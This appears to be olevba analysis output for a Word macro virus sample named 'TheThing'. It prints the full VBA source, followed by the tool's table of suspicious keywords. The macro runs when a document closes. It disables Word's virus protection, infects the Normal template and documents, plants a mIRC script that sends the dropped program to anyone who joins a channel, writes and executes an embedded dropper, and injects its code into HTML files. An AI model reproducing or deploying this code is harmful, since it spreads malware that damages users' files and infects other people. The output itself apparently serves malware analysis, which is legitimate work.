olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.TheThing-9646cbf43770c4950a2e600c050fb95fe6e14079
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.TheThing-9646cbf43770c4950a2e600c050fb95fe6e14079 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
 On Error Resume Next
'TheThing
' by CyberShadow//SMF
 Call DisableAll
 Call infectDoc
 Call infectMIRC
 Call WriteDump("c:\"): rv = Shell("c:\thething.com", 6)
 Kill "c:\thething.com"
 Call infectHTMS
 Application.ScreenUpdating = True
End Sub
Private Sub infectHTMS()
 On Error Resume Next
 a = System.PrivateProfileString("", "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", "Personal")
 Call SearchForHTM(a)
 a = Environ("PATH")
 i = 1
 Do While i <= Len(a)
  c = ""
  Do While i <= Len(a) And Mid$(a, i, 1) <> ";"
   c = c + Mid$(a, i, 1)
   i = i + 1
  Loop
  Call SearchForHTM(c)
  i = i + 1
 Loop
End Sub
Private Sub ViewVBCode(): Stealth: End Sub
Private Sub ToolsMacro(): Stealth: End Sub
Private Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth(): On Error Resume Next
    ShowVisualBasicEditor = 0: Application.EnableCancelKey = 0
End Sub
Private Sub SearchForHTM(PathForHTM)
 On Error Resume Next
 Target = Dir$(PathForHTM + "\*.htm*")
 If Target = "" Then GoTo NoHTMs
 Do
  Open PathForHTM + "\" + Target For Input As #1
  Line Input #1, a
  If a <> "<html> <CyberShadow>" Then
   c = a
   Do While Not EOF(1)
    Input #1, a
    c = c + Chr$(13) + Chr$(10) + a
   Loop
  Close #1
  Open PathForHTM + "\" + Target For Output As #1
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   For i = 1 To AD.countoflines
    ca = AD.lines(i, 1)
    If i < 30 Then ca = Mid$(ca, 2, Len(ca) - 1)
    If i >= 30 And i < AD.countoflines - 2 Then ca = "'" + ca
    If ca <> "" Then Print #1, ca
   Next
  Print #1, c
  End If
  Close #1
  Target = Dir$
 Loop While Target <> ""
NoHTMs:
End Sub
Private Sub infectMIRC()
 For i = 0 To 5
  a = Chr$(Asc("C") + i)
  Call infect(a)
 Next
End Sub
Private Sub infect(a)
 On Error GoTo outta
 a1 = a + ":\mirc\"
 Open a1 + "script.ini" For Output As #1
  Print #1, "[script]"
  Print #1, "n0=on 1:JOIN:#:/dcc send $nick " + a1 + "thething.com"
 Close #1
 dropperPath = a1
 Call WriteDump(dropperPath)
outta:
End Sub
Private Sub DisableAll()
 On Error Resume Next
 SetAttr NormalTemplate.Path + "\" + NormalTemplate, 0
 With Application
  .EnableCancelKey = True
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
End Sub
Private Sub infectDoc()
 On Error Resume Next
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 If NT.lines(1, 1) <> "<html> <CyberShadow>" Then
   NT.DeleteLines 1, NT.countoflines
   NT.Insertlines 1, AD.lines(1, AD.countoflines)
 End If
 If AD.lines(1, 1) <> "<html> <CyberShadow>" Then
   AD.DeleteLines 1, AD.countoflines
   AD.Insertlines 1, NT.lines(1, NT.countoflines)
 End If
 i = 1: c = AD.countofline
 Do While i <= c
  If AD.lines(i, 1) = "</HTML" + ">" Then
   AD.DeleteLines i + 1, AD.countoflines - i - 1
   i = c
  End If
  i = i + 1
 Loop
 i = 1: c = NT.countoflines
 Do While i <= c
  If NT.lines(i, 1) = "</HTML" + ">" Then
   NT.DeleteLines i + 1, NT.countoflines - i - 1
   i = c
  End If
  i = i + 1
 Loop
End Sub
Private Sub WriteDump(dropperPath)
 On Error Resume Next
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 checkit = "Dumpin"
 i = 1: GetDump = 0
 Do While i < AD.countoflines
  a = AD.lines(i, 1)
  If Len(a) > Len(checkit) Then
   For j = 1 To Len(a) - Len(checkit)
    If Mid$(a, j, Len(checkit) + 1) = checkit + "g" Then GetDump = i + 1: i = AD.countoflines
   Next
  End If
  i = i + 1
 Loop
 dropperBody = ""
 Do While Mid$(AD.lines(GetDump, 1), 1, 1) = "'"
  If Len(AD.lines(GetDump, 1)) > 2 Then
   For i = 2 To Len(AD.lines(GetDump, 1)) Step 2
    If Mid$(AD.lines(GetDump, 1), i, 1) <> " " Then
     a1 = Asc(Mid$(AD.lines(GetDump, 1), i, 1)) - 33
     b1 = Asc(Mid$(AD.lines(GetDump, 1), i + 1, 1)) - 33
     dropperBody = dropperBody + Chr$(a1 + 16 * b1)
    End If
   Next
  End If
  GetDump = GetDump + 1
 Loop
 Open dropperPath + "thething.com" For Output As #1
  Print #1, dropperBody;
 Close #1
End Sub
Private Sub Dumping()

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

